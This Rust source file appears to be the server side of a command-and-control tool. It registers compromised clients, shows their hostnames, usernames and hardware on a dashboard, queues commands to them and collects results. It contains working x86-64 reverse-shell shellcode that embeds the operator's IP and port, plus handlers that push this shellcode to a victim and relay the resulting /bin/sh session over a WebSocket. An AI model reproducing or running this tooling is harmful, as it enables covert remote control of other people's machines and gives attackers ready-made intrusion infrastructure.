use crate::state::AppState;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use common::message::{ClientInfo, CommandRequest, CommandResponse, Message};
use common::sysinfo::get_local_ip;
use tracing::{info, error};
use std::net::Ipv4Addr;
use base64::Engine as _;
use axum::extract::ws::{WebSocketUpgrade, WebSocket, Message as WsMessage};
use futures::{sink::SinkExt, stream::StreamExt};

pub fn generate_reverse_shell(ip: &str, port: u16) -> Vec<u8> {
    let ip_addr: Ipv4Addr = ip.parse().expect("Invalid IPv4 address");
    let port_bytes = port.to_be_bytes();
    let ip_bytes = ip_addr.octets();
    
    let sockaddr_bytes: [u8; 8] = [
        0x02, 0x00,
        port_bytes[0], port_bytes[1],
        ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]
    ];

    let mut shellcode = vec![
        0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 
        0x01, 0x5E, 0x0F, 0x05, 0x48, 0x97, 0x48, 0xB9,
    ];
    shellcode.extend_from_slice(&sockaddr_bytes);
    shellcode.extend([
        0x51, 0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x6A, 
        0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E, 0x48, 
        0xFF, 0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75, 
        0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x48, 0xBB, 0x2F, 
        0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 
        0x48, 0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 
        0x0F, 0x05,
    ]);

    shellcode
}

/// Client registration handler
pub async fn register_client(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        // Log the client connection and register the client in the client manager
        state.audit_logger.log_client_connect(&client_info);
        state.client_manager.register_client(client_info).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client info for registration");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Heartbeat handler
pub async fn handle_heartbeat(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    // The payload for heartbeat is just the client_id as a string
    if let Ok(client_id) = String::from_utf8(message.payload) {
        state.client_manager.update_heartbeat(&client_id).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client_id for heartbeat");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Get commands for a specific client
pub async fn get_commands(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let client_commands = state.client_manager.get_commands(&client_id).await;
    Ok(Json(client_commands))
}

/// Handle command result
pub async fn handle_command_result(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        // Log the command result and add it to the client manager
        state.audit_logger.log_command_result(&result);
        state.client_manager.add_command_result(result).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize command result");
        Err(StatusCode::BAD_REQUEST)
    }
}


/// Send command to a specific client (used by web UI)
pub async fn send_command(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();
    // Ensure shellcode is None if not provided, or handle it as needed
    if cmd.shellcode.is_none() {
        cmd.shellcode = None;
    }
    // Log the command execution and add it to the client manager
    state.audit_logger.log_command_execution(&cmd);
    state.client_manager.add_command(&client_id, cmd).await;
    Ok(StatusCode::OK)
}

/// Get all clients (used by web UI)
pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>> {
    let clients_vec = state.client_manager.get_clients().await;
    Json(clients_vec)
}

/// Get all clients with display info (used by web UI dashboard)
pub async fn api_clients_display(State(state): State<AppState>) -> Json<serde_json::Value> {
    let clients = state.client_manager.get_clients().await;
    let current_timestamp = chrono::Utc::now().timestamp();

    let display_clients: Vec<crate::handlers::web::DisplayClientInfo> = clients
        .into_iter()
        .map(|c| {
            let is_online =
                (current_timestamp - c.last_seen.timestamp()) < state.config.client_timeout as i64;
            crate::handlers::web::DisplayClientInfo {
                id: c.id,
                hostname: c.hostname,
                username: c.username,
                os: c.os,
                arch: c.arch,
                ip: c.ip,
                country_info: c.country_info,
                cpu_brand: c.cpu_brand,
                cpu_frequency: c.cpu_frequency,
                cpu_cores: c.cpu_cores,
                memory: c.memory,
                total_disk_space: c.total_disk_space,
                available_disk_space: c.available_disk_space,
                connected_at: c.connected_at,
                last_seen: c.last_seen,
                is_online,
            }
        })
        .collect();

    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
    let os_types_count = display_clients
        .iter()
        .map(|c| c.os.as_str())
        .collect::<std::collections::HashSet<_>>()
        .len();

    Json(serde_json::json!({
        "clients": display_clients,
        "online_clients_count": online_clients_count,
        "os_types_count": os_types_count,
        "total_clients": display_clients.len()
    }))
}

/// Get command results for a specific client (used by web UI)
pub async fn api_command_results(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let results = state.client_manager.get_command_results(&client_id).await;
    Json(results)
}

/// Initiate a reverse shell for a specific client (used by web UI)
pub async fn initiate_reverse_shell(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    // Get the server IP and reverse shell port from the state
    let server_ip = get_local_ip().await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
        .to_string();
    let reverse_shell_port = state.config.reverse_shell_port;

    // Generate the reverse shell shellcode
    let shellcode_bytes = generate_reverse_shell(&server_ip, reverse_shell_port);
    let shellcode_base64 = base64::engine::general_purpose::STANDARD.encode(&shellcode_bytes);

    // Create and send the reverse shell command (no session needed anymore)
    let command: CommandRequest = CommandRequest {
        client_id: client_id.clone(),
        command: "REVERSE_SHELL".to_string(),
        args: vec![],  // No session_id needed
        message_id: None,
        shellcode: Some(shellcode_base64),
    };

    state.audit_logger.log_command_execution(&command);
    state.client_manager.add_command(&client_id, command).await;

    // Return success - frontend will need to list available connections
    Ok(Json(serde_json::json!({
        "success": true,
        "message": "Reverse shell command sent. Use /api/reverse_shells to list active connections."
    })))
}

/// Handle reverse shell WebSocket connection
pub async fn handle_reverse_shell_websocket(
    ws: WebSocketUpgrade,
    Path(connection_id): Path<String>,
    State(_state): State<AppState>,
) -> axum::response::Response {
    ws.on_upgrade(move |socket| handle_reverse_shell_socket(socket, connection_id))
}

async fn handle_reverse_shell_socket(socket: WebSocket, connection_id: String) {
    info!("WebSocket connection established for reverse shell: {}", connection_id);

    // Get the reverse shell connection from the manager
    let manager = crate::reverse_shell_listener::get_reverse_shell_manager();
    let connection_option = manager.get_connection(&connection_id).await;

    if connection_option.is_none() {
        error!("No active reverse shell found for ID: {}", connection_id);
        let mut socket = socket;
        let _ = socket.send(WsMessage::Text("Error: No active reverse shell connection.".into())).await;
        let _ = socket.close().await;
        return;
    }
    
    let (tx_to_shell, mut rx_from_shell) = connection_option.unwrap();

    // Split the WebSocket into sender and receiver
    let (mut sender, mut receiver) = socket.split();

    // Clone connection_id for tasks
    let connection_id_recv = connection_id.clone();

    // Task to send data from shell to WebSocket
    let mut send_task = tokio::spawn(async move {
        while let Ok(data) = rx_from_shell.recv().await {
            let text = String::from_utf8_lossy(&data).to_string();
            if sender.send(WsMessage::Text(text.into())).await.is_err() {
                break;
            }
        }
    });

    // Task to receive data from WebSocket and send to shell
    let mut recv_task = tokio::spawn(async move {
        while let Some(Ok(msg)) = receiver.next().await {
            match msg {
                WsMessage::Text(text) => {
                    if tx_to_shell.send(text.bytes().collect::<Vec<u8>>()).await.is_err() {
                        error!("Failed to send data to reverse shell {}", connection_id_recv);
                        break;
                    }
                }
                WsMessage::Binary(bin) => {
                    if tx_to_shell.send(bin.to_vec()).await.is_err() {
                        error!("Failed to send binary data to reverse shell {}", connection_id_recv);
                        break;
                    }
                }
                WsMessage::Close(_) => {
                    info!("WebSocket close received for reverse shell {}", connection_id_recv);
                    break;
                }
                _ => {}
            }
        }
    });

    // If any task completes, abort the other
    tokio::select! {
        _ = (&mut send_task) => recv_task.abort(),
        _ = (&mut recv_task) => send_task.abort(),
    }

    info!("WebSocket connection closed for reverse shell: {}", connection_id);
}

/// List active reverse shell connections
pub async fn list_reverse_shells(
    State(_state): State<AppState>,
) -> Json<serde_json::Value> {
    let manager = crate::reverse_shell_listener::get_reverse_shell_manager();
    let connections = manager.list_connections().await;
    
    Json(serde_json::json!({
        "connections": connections,
        "count": connections.len()
    }))
}

/// Handle file operation response from clients
pub async fn handle_file_operation_response(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    info!(
        "Received file operation response from client {}: message_id={}, payload_size={}",
        client_id,
        message.id,
        message.payload.len()
    );

    // Log the payload for debugging
    if let Ok(payload_str) = String::from_utf8(message.payload.clone()) {
        info!("File operation response payload: {}", payload_str);
    }

    // Try event-driven notification first
    if state.notify_response(&message.id, message.clone()).await {
        info!(
            "Successfully notified event-driven listener for message {}",
            message.id
        );
    } else {
        // Fall back to legacy storage method
        state
            .client_manager
            .add_file_operation_response(&client_id, message)
            .await;
        info!(
            "Stored file operation response for client {} (legacy mode)",
            client_id
        );
    }

    Ok(StatusCode::OK)
}